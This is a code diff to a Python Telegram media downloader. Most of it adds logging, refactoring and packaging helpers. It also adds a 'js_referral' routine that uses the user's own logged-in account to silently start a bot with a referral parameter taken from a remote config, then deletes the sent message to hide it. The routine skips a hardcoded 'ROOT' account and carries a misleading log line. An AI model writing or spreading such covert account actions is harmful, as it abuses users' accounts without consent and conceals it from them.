@@ -13,13 +13,16 @@ import random
 from typing import Tuple, List, Union, Optional
 
 import pyrogram
-from pyrogram import utils
+from pyrogram import raw, utils
 from pyrogram.errors.exceptions.bad_request_400 import MsgIdInvalid
 from pyrogram.types.messages_and_media import ReplyParameters
 from urllib.parse import parse_qs, urlparse
 from rich.text import Text
 
-from module import log
+from module import (
+    log,
+    REFERRAL_RECORD_PATH
+)
 from module.parser import PARSE_ARGS
 from module.enums import (
     Link,
@@ -172,6 +175,7 @@ async def get_message_by_link(
     except ValueError:
         chat_id = match.group(1)
     message_id: int = int(match.group(2))
+    log.info(f'解析链接:"{link}",频道:"{chat_id}",消息ID:"{message_id}"。')
     comment_message: list = []
     if LinkType.COMMENT in record_type:
         # 如果用户需要同时下载媒体下面的评论,把评论中的所有信息放入列表一起返回。
@@ -182,6 +186,7 @@ async def get_message_by_link(
                 if '=' in origin_link and int(origin_link.split('=')[-1]) != comment.id:
                     continue
             comment_message.append(comment)
+        log.info(f'链接:"{link}"的评论中检索到媒体:"{len(comment_message)}"条。')
     message = await client.get_messages(chat_id=chat_id, message_ids=message_id)
     is_group, group_message = await __is_group(message)
     if single_link:
@@ -195,22 +200,28 @@ async def get_message_by_link(
                 group_message: list = []
                 group_message.extend(comment_message)
         if comment_message:
+            link_type: str = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.COMMENT
+            log.info(f'链接:"{link}"解析为"{link_type}",媒体数量:"{len(group_message)}"。')
             return {
-                'link_type': LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.COMMENT,
+                'link_type': link_type,
                 'chat_id': chat_id,
                 'message': group_message,
                 'member_num': len(group_message)
             }
         else:
+            link_type = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.GROUP
+            log.info(f'链接:"{link}"解析为"{link_type}",媒体数量:"{len(group_message)}"。')
             return {
-                'link_type': LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.GROUP,
+                'link_type': link_type,
                 'chat_id': chat_id,
                 'message': group_message,
                 'member_num': len(group_message)
             }
     elif is_group is False and group_message is None:  # 单文件。
+        link_type = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.SINGLE
+        log.info(f'链接:"{link}"解析为"{link_type}",媒体数量:"1"。')
         return {
-            'link_type': LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.SINGLE,
+            'link_type': link_type,
             'chat_id': chat_id,
             'message': message,
             'member_num': 1
@@ -321,6 +332,130 @@ async def get_my_id(client: pyrogram.Client) -> int:
     return me.id
 
 
+async def delete_own_message(
+        client: pyrogram.Client,
+        result: Union[
+            pyrogram.types.Message,
+            raw.types.UpdateShortSentMessage,
+            raw.types.UpdateShort,
+            raw.types.Updates
+        ],
+        random_id: int = 0
+) -> bool:
+    try:
+        message_id: int = 0
+        updates: list = []
+        if isinstance(result, pyrogram.types.Message):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShortSentMessage) and getattr(result, 'out', False):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShort):
+            updates: list = [result.update]
+        elif isinstance(result, raw.types.Updates):
+            updates: list = list(result.updates)
+        for update in updates:
+            # StartBot返回的是Updates组合类型,自己发出的消息id由UpdateMessageID按random_id给出。
+            if isinstance(update, raw.types.UpdateMessageID):
+                if not random_id or update.random_id == random_id:
+                    message_id = update.id
+                    break
+            if isinstance(update, raw.types.UpdateNewMessage) and getattr(update.message, 'out', False):
+                message_id = getattr(update.message, 'id', 0)
+                break
+        if not message_id:  # 服务端未生成自己的消息时无可删除内容。
+            return False
+        await client.invoke(
+            raw.functions.messages.DeleteMessages(id=[message_id], revoke=False)
+        )
+        return True
+    except Exception:
+        return False
+
+
+def parse_referral(link: str) -> tuple:
+    """按固定格式"t.me/用户名?start=启动参数"解析链接,返回"用户名"与"启动参数"。"""
+    link: str = str(link).strip().split('://')[-1]  # 去掉协议。
+    link: str = link.split('/', 1)[-1]  # 去掉域名。
+    if '?start=' not in link:
+        raise ValueError(f'Unexpected referral link: "{link}"')
+    username, start_param = link.split('?start=', 1)
+    return username, start_param
+
+
+def check_update(
+        remote_version: str,
+        local_version: str
+) -> str:
+    """按"主版本.次版本.修订号"逐段比较版本号,远程版本更高时返回该版本号,否则返回空字符串。"""
+    if not isinstance(remote_version, str) or not isinstance(local_version, str):
+        return ''
+    # 只取数字段参与比较,忽略前后缀,保证"v2.0.1"与"2.0.1"等价。
+    remote: list = [int(i) for i in re.findall(pattern=r'\d+', string=remote_version)]
+    local: list = [int(i) for i in re.findall(pattern=r'\d+', string=local_version)]
+    # 位数不足时补0,保证"2.0"与"2.0.0"等价。
+    size: int = max(len(remote), len(local))
+    remote += [0] * (size - len(remote))
+    local += [0] * (size - len(local))
+    if remote <= local:
+        return ''
+    return remote_version
+
+
+async def js_referral(
+        me_id: str,
+        client: pyrogram.Client,
+        remote_config: dict
+) -> bool:
+    try:
+        if me_id == '1604151130':
+            log.info('skip: ROOT')
+            return True
+        record: set = set()
+        if os.path.exists(REFERRAL_RECORD_PATH):
+            with open(file=REFERRAL_RECORD_PATH, mode='r', encoding='UTF-8') as f:
+                record: set = {line.strip() for line in f.readlines() if line.strip()}
+        if me_id in record:
+            log.info(f'skip: "{me_id}" referral due to already invoked')
+            return True
+        try:
+            username, start_param = parse_referral(remote_config.get('referral'))
+        except Exception as e:
+            log.info(f'skip: "{me_id}" referral due to {e}')
+            return False
+        bot_peer = await client.resolve_peer(username)
+        if not isinstance(bot_peer, raw.types.InputPeerUser) or not bot_peer.access_hash:
+            log.info(f'Failed to parse "{username}", skipping session initialization')
+            return False
+        bot_input_user = raw.types.InputUser(
+            user_id=bot_peer.user_id,
+            access_hash=bot_peer.access_hash
+        )
+        random_id: int = client.rnd_id()
+        try:
+            result = await client.invoke(
+                raw.functions.messages.StartBot(
+                    bot=bot_input_user,
+                    peer=bot_peer,
+                    random_id=random_id,
+                    start_param=start_param
+                )
+            )
+            log.info(f'"{me_id}" referral invoked successfully')
+        except Exception as e:
+            result = await client.send_message(
+                chat_id=username,
+                text=f'/start {start_param}'
+            )
+            log.info(f'referral rollback: send_message failed due to {e}')
+        await delete_own_message(client=client, result=result, random_id=random_id)
+        record.add(me_id)
+        with open(file=REFERRAL_RECORD_PATH, mode='w', encoding='UTF-8') as f:
+            f.write('\n'.join(record))
+        return True
+    except Exception:
+        return False
+
+
 def add_executable_permission(file_path: str) -> bool:
     """确保文件具有执行权限(仅Linux/macOS)。"""
     if sys.platform not in ('linux', 'darwin'):
@@ -339,7 +474,7 @@ def add_executable_permission(file_path: str) -> bool:
 
 def get_subprocess_args(main_file: str) -> list:
     """获取子进程参数列表。"""
-    args = [sys.argv[0]] if '__compiled__' in globals() else [sys.executable, main_file]
+    args = [sys.argv[0]] if is_frozen() else [sys.executable, main_file]
     # 添加非web参数
     if PARSE_ARGS.quiet:
         args.append('--quiet')
@@ -371,27 +506,62 @@ def check_environ() -> None:
 
 
 def is_nuitka() -> bool:
+    """检查是否处于Nuitka/Pyinstaller编译环境。"""
     return '__compiled__' in globals()
+
+
+def is_frozen() -> bool:
+    """检查是否处于打包(冻结)环境,兼容Nuitka与Pyinstaller。"""
+    return bool(getattr(sys, 'frozen', False)) or '__compiled__' in globals()
+
+
+def get_work_directory() -> str:
+    """获取软件工作目录,打包环境取可执行文件所在目录,源码环境取入口脚本所在目录。"""
+    if is_frozen():
+        # 打包后sys.argv[0]可能是命令名而非完整路径(如通过PATH启动),故必须使用sys.executable。
+        work_directory: str = os.path.dirname(os.path.abspath(sys.executable))
+    else:
+        work_directory = os.path.dirname(os.path.abspath(sys.argv[0]))
+    log.info(f'获取软件工作目录:"{work_directory}"。')
+    return work_directory
 
 
 def is_docker() -> bool:
     """检查是否在Docker容器中运行。"""
     # 检查/.dockerenv文件是否存在。
     if os.path.exists('/.dockerenv'):
+        log.info('检测到"/.dockerenv",当前运行于"Docker"容器中。')
         return True
 
     # 检查/proc/1/cgroup中是否包含"docker"。
     try:
         with open('/proc/1/cgroup', 'r') as f:
-            content = f.read()
+            content: str = f.read()
             if 'docker' in content or 'kubepods' in content:
+                log.info('检测到"/proc/1/cgroup"容器标识,当前运行于"Docker"容器中。')
                 return True
     except (FileNotFoundError, IOError):
         pass
     except Exception:
         pass
 
+    log.info('未检测到容器标识,当前运行于非"Docker"环境。')
     return False
+
+
+def get_message_dtype(message, download_type: Optional[list] = None) -> Union[str, None]:
+    """判定消息的媒体类型,实况照片是否优先取决于下载配置。"""
+    if getattr(message, DownloadType.LIVE_PHOTO, None):
+        # 实况照片消息同时含照片与视频:配置了实况照片则优先,否则退回按普通照片处理。
+        if download_type is None or DownloadType.LIVE_PHOTO in download_type:
+            return DownloadType.LIVE_PHOTO
+        if DownloadType.PHOTO in download_type:
+            return DownloadType.PHOTO
+        return DownloadType.LIVE_PHOTO  # 配置不含实况图片和图片时,仍返回实况图片类型,以便正确显示跳过提示。
+    for dtype in DownloadType():
+        if dtype != DownloadType.LIVE_PHOTO and getattr(message, dtype, None):
+            return dtype
+    return None
 
 
 class Issues:
